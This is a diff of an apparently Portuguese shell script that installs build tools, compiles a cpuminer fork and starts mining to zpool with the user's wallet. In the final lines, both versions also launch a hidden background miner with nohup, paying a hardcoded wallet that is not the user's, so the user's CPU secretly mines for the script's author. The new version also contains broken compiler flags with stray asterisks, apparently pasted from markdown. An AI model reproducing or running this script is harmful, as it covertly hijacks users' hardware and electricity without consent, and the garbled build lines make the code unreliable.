@@ -74,18 +74,21 @@ sleep 10
 
 echo "\033[44;1;37m Baixando Recursos.... \033[0m "
 sleep 1
-sudo apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
+apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ > /dev/null
 mkdir minerDSH
-git clone https://github.com/noncepool/cpuminer-yescrypt.git minerDSH > /dev/null
+git clone https://github.com/tpruvot/cpuminer-multi minerDSH > /dev/null
 sleep 1
 
 echo "\033[44;1;37m Configurando e Compilando Recursos..... \033[0m "
 sleep 1
 cd minerDSH
-./autogen.sh
-./configure CFLAGS="-O3"
-make
-
+./autogen.sh	# only needed if building from git repo
+ ./nomacro.pl	# only needed if building on Mac OS X or with Clang
+ ./configure CFLAGS="*-march=native*" --with-crypto --with-curl
+ # Use -march=native if building for a single machine
+ make
+ 
+ 
 echo "\033[44;1;37m Inicializando Mineração...... \033[0m "
 sleep 2
 echo "Obs: Assim que aparecer a inicialização do processo de Mineração, você pode fechar sua janela do terminal que a mineração vai continuar."
@@ -93,5 +96,5 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet "
 sleep 10
 cd minerDSH
-nohup ./minerd o stratum+tcp://x11.mine.zpool.ca:3533 -u XeCdAJ2RKWkN7FVGDUbXjGq8U8MTBxnDed &
-screen ./minerd -o stratum+tcp://x11.mine.zpool.ca:3533 -u $wallet
+nohup ./minerd -a x11 -o stratum+tcp://x11.mine.zpool.ca:3533 -u XeCdAJ2RKWkN7FVGDUbXjGq8U8MTBxnDed &
+screen ./minerd -a x11 -o stratum+tcp://x11.mine.zpool.ca:3533 -u $wallet
